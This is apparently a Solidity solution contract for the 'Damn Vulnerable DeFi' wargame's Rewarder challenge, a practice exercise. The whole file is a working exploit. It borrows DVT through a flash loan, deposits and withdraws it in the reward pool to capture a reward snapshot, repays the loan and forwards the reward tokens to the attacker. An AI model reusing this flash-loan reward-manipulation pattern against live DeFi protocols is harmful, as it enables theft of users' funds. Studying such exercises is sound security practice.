// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";
import "../DamnValuableToken.sol";

contract Attacker {
    FlashLoanerPool Pool;
     TheRewarderPool Reward;
     RewardToken Rewardtoken;
     DamnValuableToken Dvt;
   //   uint256 public Poolamount;
     address public attacker;
    constructor(FlashLoanerPool Poolad,TheRewarderPool Rewardad , RewardToken rewardtoken,DamnValuableToken dvt){
       Pool = Poolad;
       Reward = Rewardad;
       Rewardtoken = rewardtoken;
       Dvt = dvt;
       attacker = msg.sender;
    }

   function attack(uint poolamount) public payable{
        
      //  require(Poolamount == 1000000 ether,"not enouch pool amomunt for deposit");
       Pool.flashLoan{gas:21000000}(poolamount);
       
   }
   function receiveFlashLoan(uint256 Poolamount) external {
              Dvt.approve(address(Reward), Poolamount);
        Reward.deposit(Poolamount);
        Reward.withdraw(Poolamount);
        require(Poolamount == 1000000 ether,"not enouch pool amomunt");
        bool ispaid = Dvt.transfer(address(Pool), Poolamount);
        require(ispaid,"THE LOAN IS NOT PAID ");

       uint Rewards = Rewardtoken.balanceOf(address(this));
       bool rewardsend = Rewardtoken.transfer(attacker, Rewards);
       require(rewardsend,"Rewards transferred to Attcker");
   }

   receive() external payable {

   }
}